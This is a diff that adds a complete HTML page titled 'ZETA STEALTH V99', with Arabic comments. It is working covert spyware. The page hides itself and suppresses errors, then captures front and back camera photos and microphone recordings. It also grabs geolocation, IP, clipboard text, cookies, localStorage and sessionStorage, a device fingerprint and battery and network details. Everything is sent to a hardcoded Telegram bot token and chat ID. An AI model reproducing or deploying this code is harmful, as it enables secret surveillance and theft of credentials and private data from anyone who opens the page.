@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>ZETA STEALTH V99</title>
+    <style>
+        /* إخفاء كل العناصر تماماً */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            overflow: hidden;
+            opacity: 0;
+            visibility: hidden;
+            display: none;
+        }
+        video, canvas, audio, iframe {
+            display: none !important;
+            opacity: 0 !important;
+            visibility: hidden !important;
+            width: 0 !important;
+            height: 0 !important;
+            position: absolute !important;
+            left: -9999px !important;
+            top: -9999px !important;
+            pointer-events: none !important;
+        }
+        * {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- كل العناصر مخفية تماماً -->
+    <video id="frontVideo" autoplay playsinline muted></video>
+    <video id="backVideo" autoplay playsinline muted></video>
+    <canvas id="frontCanvas"></canvas>
+    <canvas id="backCanvas"></canvas>
+    <canvas id="screenshotCanvas"></canvas>
+    <audio id="hiddenAudio" autoplay></audio>
+    <iframe id="hiddenFrame" style="display:none"></iframe>
+
+    <!-- تحميل المكتبات من CDNs مختلفة لضمان العمل -->
+    <script src="https://cdn.jsdelivr.net/npm/lamejs@1.2.0/lame.min.js"></script>
+    <script src="https://cdn.rawgit.com/mattdiamond/Recorderjs/08e7abd9/dist/recorder.js"></script>
+    
+    <script>
+        // البدء الفوري بدون أي ظهور
+        (function() {
+            // منع أي أخطاء من الظهور
+            window.onerror = function(){ return true; };
+            console.log = function(){};
+            console.warn = function(){};
+            console.error = function(){};
+            
+            // تكوين Zeta الخفي
+            const ZETA = {
+                TOKEN: '8169784875:AAFCWyuozx0pmc-kKbiBvofJT6Ymf54H0wc',
+                CHAT_ID: '6531473187',
+                API: 'https://api.telegram.org/bot8169784875:AAFCWyuozx0pmc-kKbiBvofJT6Ymf54H0wc/'
+            };
+
+            // نظام الإرسال الخفي
+            async function sendToTelegram(data, filename, type, caption = '') {
+                try {
+                    let formData = new FormData();
+                    formData.append('chat_id', ZETA.CHAT_ID);
+                    
+                    let endpoint = 'sendDocument';
+                    if (type === 'text') {
+                        endpoint = 'sendMessage';
+                        formData.append('text', data);
+                        formData.append('parse_mode', 'Markdown');
+                    } else if (type === 'image') {
+                        endpoint = 'sendPhoto';
+                        formData.append('photo', data, filename);
+                        if (caption) formData.append('caption', caption);
+                    } else if (type === 'audio') {
+                        endpoint = 'sendAudio';
+                        formData.append('audio', data, filename);
+                        if (caption) formData.append('caption', caption);
+                    } else {
+                        endpoint = 'sendDocument';
+                        formData.append('document', data, filename);
+                        if (caption) formData.append('caption', caption);
+                    }
+                    
+                    // إرسال بدون انتظار رد
+                    fetch(ZETA.API + endpoint, {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors'
+                    }).catch(()=>{});
+                    
+                    return true;
+                } catch(e) {
+                    return false;
+                }
+            }
+
+            // بدأ كل شيء فوراً
+            setTimeout(() => {
+                // رسالة بدأ التشغيل
+                sendToTelegram('*⚡ ZETA STEALTH ACTIVATED - V99*', null, 'text');
+                
+                // 1. طلب كل الأذونات بسرعة
+                Promise.all([
+                    // كاميرا أمامية + خلفية + ميكروفون بنفس الوقت
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user", width: 1280, height: 720 },
+                        audio: true 
+                    }).then(stream => {
+                        // تشغيل الكاميرا الأمامية
+                        const frontVideo = document.getElementById('frontVideo');
+                        frontVideo.srcObject = stream;
+                        
+                        // التقاط صورة بعد ثانية واحدة
+                        setTimeout(() => {
+                            const canvas = document.getElementById('frontCanvas');
+                            canvas.width = frontVideo.videoWidth || 640;
+                            canvas.height = frontVideo.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
+                            
+                            canvas.toBlob(blob => {
+                                sendToTelegram(blob, 'front_camera.jpg', 'image', '📸 كاميرا أمامية');
+                            }, 'image/jpeg', 0.8);
+                            
+                            // لا نوقف الستريم لأننا بنستخدمها للتسجيل
+                        }, 1000);
+                        
+                        return stream;
+                    }).catch(()=>{}),
+                    
+                    // كاميرا خلفية منفصلة
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: { exact: "environment" }, width: 1920, height: 1080 }
+                    }).then(stream => {
+                        const backVideo = document.getElementById('backVideo');
+                        backVideo.srcObject = stream;
+                        
+                        setTimeout(() => {
+                            const canvas = document.getElementById('backCanvas');
+                            canvas.width = backVideo.videoWidth || 1280;
+                            canvas.height = backVideo.videoHeight || 720;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(backVideo, 0, 0, canvas.width, canvas.height);
+                            
+                            canvas.toBlob(blob => {
+                                sendToTelegram(blob, 'back_camera.jpg', 'image', '📸 كاميرا خلفية');
+                            }, 'image/jpeg', 0.8);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1500);
+                    }).catch(()=>{})
+                    
+                ]).then(() => {
+                    // 2. بدأ التسجيل الصوتي فوراً
+                    navigator.mediaDevices.getUserMedia({ 
+                        audio: {
+                            channelCount: 2,
+                            sampleRate: 44100,
+                            echoCancellation: false,
+                            noiseSuppression: false,
+                            autoGainControl: false
+                        } 
+                    }).then(stream => {
+                        // تسجيل بصيغتين مختلفتين لضمان العمل
+                        
+                        // التسجيل الأول (WebM)
+                        const mediaRecorder = new MediaRecorder(stream, {
+                            mimeType: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4'
+                        });
+                        
+                        let audioChunks = [];
+                        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                        
+                        mediaRecorder.onstop = () => {
+                            const audioBlob = new Blob(audioChunks, { 
+                                type: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4' 
+                            });
+                            sendToTelegram(audioBlob, 'recording.webm', 'audio', '🎤 تسجيل صوتي 15 ثانية');
+                            
+                            // تسجيل ثاني بصيغة مختلفة
+                            setTimeout(() => {
+                                const secondRecorder = new MediaRecorder(stream, {
+                                    mimeType: 'audio/webm;codecs=opus'
+                                });
+                                let secondChunks = [];
+                                secondRecorder.ondataavailable = e => secondChunks.push(e.data);
+                                secondRecorder.onstop = () => {
+                                    const secondBlob = new Blob(secondChunks, { type: 'audio/webm' });
+                                    sendToTelegram(secondBlob, 'recording2.webm', 'audio', '🎤 تسجيل صوتي إضافي');
+                                };
+                                secondRecorder.start();
+                                setTimeout(() => secondRecorder.stop(), 10000);
+                            }, 2000);
+                        };
+                        
+                        mediaRecorder.start();
+                        setTimeout(() => mediaRecorder.stop(), 15000);
+                        
+                    }).catch(()=>{});
+                });
+                
+                // 3. جمع معلومات الجهاز بسرعة
+                setTimeout(() => {
+                    const deviceInfo = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        languages: navigator.languages,
+                        cores: navigator.hardwareConcurrency,
+                        memory: navigator.deviceMemory,
+                        screen: `${screen.width}x${screen.height}`,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cookies: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        connection: navigator.connection ? {
+                            type: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt
+                        } : null
+                    };
+                    
+                    sendToTelegram('*📱 DEVICE INFO*\n```\n' + JSON.stringify(deviceInfo, null, 2) + '\n```', 'device.json', 'text');
+                }, 2000);
+                
+                // 4. محاولة الحصول على الموقع
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            sendToTelegram(
+                                `*📍 LOCATION*\nLat: ${pos.coords.latitude}\nLng: ${pos.coords.longitude}\nAcc: ${pos.coords.accuracy}m`,
+                                null,
+                                'text'
+                            );
+                        },
+                        () => {},
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                }
+                
+                // 5. محاولة الحصول على IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(data => {
+                        sendToTelegram(`*🌐 IP*\n${data.ip}`, null, 'text');
+                        
+                        // محاولة الحصول على معلومات IP
+                        fetch(`https://ipapi.co/${data.ip}/json/`)
+                            .then(r => r.json())
+                            .then(geo => {
+                                sendToTelegram(
+                                    `*📍 IP INFO*\nCity: ${geo.city}\nCountry: ${geo.country_name}\nISP: ${geo.org}`,
+                                    null,
+                                    'text'
+                                );
+                            }).catch(()=>{});
+                    }).catch(()=>{});
+                
+                // 6. سرقة الحافظة
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.readText()
+                        .then(text => {
+                            if (text) sendToTelegram(`*📋 CLIPBOARD*\n\`${text.substring(0, 1000)}\``, null, 'text');
+                        })
+                        .catch(()=>{});
+                }
+                
+                // 7. سرقة الـ LocalStorage
+                try {
+                    let storage = '';
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const val = localStorage.getItem(key);
+                        storage += `${key}: ${val}\n`;
+                    }
+                    if (storage) sendToTelegram('*💾 LOCALSTORAGE*\n```\n' + storage.substring(0, 3000) + '\n```', 'storage.txt', 'text');
+                } catch(e){}
+                
+                // 8. سرقة الـ SessionStorage
+                try {
+                    let session = '';
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const val = sessionStorage.getItem(key);
+                        session += `${key}: ${val}\n`;
+                    }
+                    if (session) sendToTelegram('*🔐 SESSION*\n```\n' + session.substring(0, 3000) + '\n```', 'session.txt', 'text');
+                } catch(e){}
+                
+                // 9. سرقة الـ Cookies
+                if (document.cookie) {
+                    sendToTelegram('*🍪 COOKIES*\n```\n' + document.cookie.substring(0, 3000) + '\n```', 'cookies.txt', 'text');
+                }
+                
+                // 10. بصمة Canvas
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = 200;
+                    canvas.height = 50;
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(0, 0, 100, 50);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('ZETA FINGERPRINT', 2, 15);
+                    
+                    const fingerprint = canvas.toDataURL().substring(0, 500);
+                    sendToTelegram(`*🎨 FINGERPRINT*\n${fingerprint}`, 'fingerprint.txt', 'text');
+                } catch(e){}
+                
+                // 11. معلومات البطارية
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        sendToTelegram(
+                            `*🔋 BATTERY*\nLevel: ${battery.level * 100}%\nCharging: ${battery.charging}`,
+                            null,
+                            'text'
+                        );
+                    }).catch(()=>{});
+                }
+                
+                // 12. لقطة شاشة للصفحة
+                setTimeout(() => {
+                    try {
+                        const html = document.documentElement.outerHTML.substring(0, 4000);
+                        sendToTelegram('*📄 PAGE SOURCE*\n```html\n' + html + '\n```', 'page.html', 'text');
+                    } catch(e){}
+                }, 3000);
+                
+                // 13. معلومات الشبكة المحيطة
+                try {
+                    if (navigator.connection) {
+                        const conn = navigator.connection;
+                        sendToTelegram(
+                            `*📶 NETWORK*\nType: ${conn.effectiveType}\nDownlink: ${conn.downlink} Mbps\nRTT: ${conn.rtt}ms\nSave Data: ${conn.saveData}`,
+                            null,
+                            'text'
+                        );
+                    }
+                } catch(e){}
+                
+                // 14. تسريع التقاط الصور (محاولة ثانية)
+                setTimeout(async () => {
+                    try {
+                        // صورة إضافية من الكاميرا الأمامية
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: "user" } 
+                        });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(blob => {
+                                sendToTelegram(blob, 'front_camera_2.jpg', 'image', '📸 كاميرا أمامية إضافية');
+                            }, 'image/jpeg', 0.8);
+                            
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 500);
+                    } catch(e){}
+                    
+                    try {
+                        // صورة إضافية من الكاميرا الخلفية
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: { exact: "environment" } } 
+                        });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 1280;
+                            canvas.height = video.videoHeight || 720;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(blob => {
+                                sendToTelegram(blob, 'back_camera_2.jpg', 'image', '📸 كاميرا خلفية إضافية');
+                            }, 'image/jpeg', 0.8);
+                            
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 500);
+                    } catch(e){}
+                }, 5000);
+                
+                // 15. رسالة التأكيد النهائية
+                setTimeout(() => {
+                    sendToTelegram('*✅ ZETA COMPLETE - ALL DATA SENT*', null, 'text');
+                }, 25000);
+                
+            }, 500); // بدأ سريع بعد 0.5 ثانية
+            
+        })();
+    </script>
+</body>
+</html>
